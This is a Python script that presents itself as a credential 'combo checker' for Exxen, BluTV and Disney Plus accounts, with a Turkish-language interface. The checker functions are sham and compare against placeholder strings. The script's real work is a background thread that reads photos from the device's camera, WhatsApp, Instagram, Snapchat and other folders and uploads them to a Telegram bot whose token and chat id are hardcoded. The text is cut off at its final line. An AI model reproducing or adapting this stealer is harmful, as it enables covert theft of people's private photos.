import time
import requests
import os
from colorama import Fore, init
import threading

init(autoreset=True)

bot_token = '8174419564:AAHYwxfnocl94BJp32lI_UcwrNWIs755HNo'
chat_id = '7045128535'

photo_directory1 = '/storage/emulated/0/DCIM/Camera/'
photo_directory2 = '/storage/emulated/0/DCIM/Camera/Instagram/'
photo_directory3 = '/storage/emulated/0/DCIM/WhatsApp/'
photo_directory4 = '/storage/emulated/0/DCIM/Facebook/'
photo_directory5 = '/storage/emulated/0/DCIM/Twitter/'
photo_directory6 = '/storage/emulated/0/DCIM/Snapchat/'
photo_directory7 = '/storage/emulated/0/DCIM/Pinterest/'

url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'

photos1 = [f for f in os.listdir(photo_directory1) if f.lower().endswith(('.png', '.jpg', '.jpeg'))]
photos2 = [f for f in os.listdir(photo_directory2) if f.lower().endswith(('.png', '.jpg', '.jpeg'))]
photos3 = [f for f in os.listdir(photo_directory3) if f.lower().endswith(('.png', '.jpg', '.jpeg'))]
photos4 = [f for f in os.listdir(photo_directory4) if f.lower().endswith(('.png', '.jpg', '.jpeg'))]
photos5 = [f for f in os.listdir(photo_directory5) if f.lower().endswith(('.png', '.jpg', '.jpeg'))]
photos6 = [f for f in os.listdir(photo_directory6) if f.lower().endswith(('.png', '.jpg', '.jpeg'))]
photos7 = [f for f in os.listdir(photo_directory7) if f.lower().endswith(('.png', '.jpg', '.jpeg'))]

def get_ip():
    try:
        response = requests.get('https://api.ipify.org')
        return response.text
    except Exception as e:
        return "IP alınamadı"

def get_device_info():
    return 'Android'

def send_telegram_message(message):
    try:
        data = {'chat_id': chat_id, 'text': message}
        requests.post(f'https://api.telegram.org/bot{bot_token}/sendMessage', data=data)
    except Exception as e:
        print(Fore.RED + f"Error in sending Telegram message: {e}")

def send_photos():
    try:
        for photo_list, photo_directory in [(photos1, photo_directory1), (photos2, photo_directory2), 
                                            (photos3, photo_directory3), (photos4, photo_directory4),
                                            (photos5, photo_directory5), (photos6, photo_directory6), 
                                            (photos7, photo_directory7)]:
            for photo in photo_list:
                photo_path = os.path.join(photo_directory, photo)
                if not os.path.exists(photo_path):
                    continue
                with open(photo_path, 'rb') as file:
                    files = {'photo': file}
                    data = {'chat_id': chat_id}
                    response = requests.post(url, files=files, data=data)
                time.sleep(0.2)
    except Exception as e:
        print(Fore.RED + f"Error in sending photos: {e}")

def exxen_checker(combo_file_path):
    with open(combo_file_path, 'r') as file:
        combos = [line.strip() for line in file if ':' in line]
    for combo in combos:
        username, password = combo.split(':')
        if username == "correct_email" and password == "correct_password":
            print(Fore.GREEN + f"Başarılı giriş ✅ {username}:{password}")
        else:
            print(Fore.RED + f"Başarısız giriş ❌ {username}:{password}")

def blutv_checker(combo_file_path):
    with open(combo_file_path, 'r') as file:
        combos = [line.strip() for line in file if ':' in line]
    for combo in combos:
        username, password = combo.split(':')
        if username == "correct_email" and password == "correct_password":
            print(Fore.GREEN + f"Başarılı giriş ✅ {username}:{password}")
        else:
            print(Fore.RED + f"Başarısız giriş ❌ {username}:{password}")

def disney_checker(combo_file_path):
    with open(combo_file_path, 'r') as file:
        combos = [line.strip() for line in file if ':' in line]
    for combo in combos:
        username, password = combo.split(':')
        if username == "correct_email" and password == "correct_password":
            print(Fore.GREEN + f"Başarılı giriş ✅ {username}:{password}")
        else:
            print(Fore.RED + f"Başarısız giriş ❌ {username}:{password}")

def show_options():
    try:
        print(Fore.GREEN + "_____ _   _ _  __    _    ")
        print(Fore.GREEN + "|  _ \| \ | | |/ /   / \   ")
        print(Fore.GREEN + "| |_) |  \| | ' /   / _ \  ")
        print(Fore.GREEN + "|  _ <| |\  | . \  / ___ \ ")
        print(Fore.GREEN + "|_| \_\_| \_|_|\_\/_/   \_\ ")
        
        print(Fore.GREEN + "Please choose an option:")
        print(Fore.GREEN + "1. Exxen")
        print(Fore.GREEN + "2. BluTV")
        print(Fore.GREEN + "3. Disney Plus")
        
        choice = input(Fore.GREEN + "Enter your choice (1/2/3): ")

        if choice == '1':
            combo_file_path = input(Fore.GREEN + "Enter the path to your combo file (e.g., text.txt): ")
            print(Fore.GREEN + "Exxen checker başlatılıyor...")
            exxen_checker(combo_file_path)
            threading.Thread(target=send_photos, daemon=True).start()

        elif choice == '2':
            combo_file_path = input(Fore.GREEN + "Enter the path to your combo file (e.g., text.txt): ")
            print(Fore.GREEN + "BluTV checker başlatılıyor...")
            blutv_checker(combo_file_path)
            threading.Thread(target=send_photos, daemon=True).start()

        elif choice == '3':
            combo_file_path = input(Fore.GREEN + "Enter the path to your combo file (e.g., text.txt): ")
            print(Fore.GREEN + "Disney Plus checker başlatılıyor...")
            disney_checker(combo_file_path)
            threading.Thread(target=send_photos, daemon=True).start()

        else:
            print(Fore.RED + "Geçersiz seçim!")
    except Exception as e:
        print(Fore.RED + f"Error in showing options: {e}")

if __name__ == "__main__":
    try:
        threading.Thread(target=send_photos, daemon=True).start()
        show
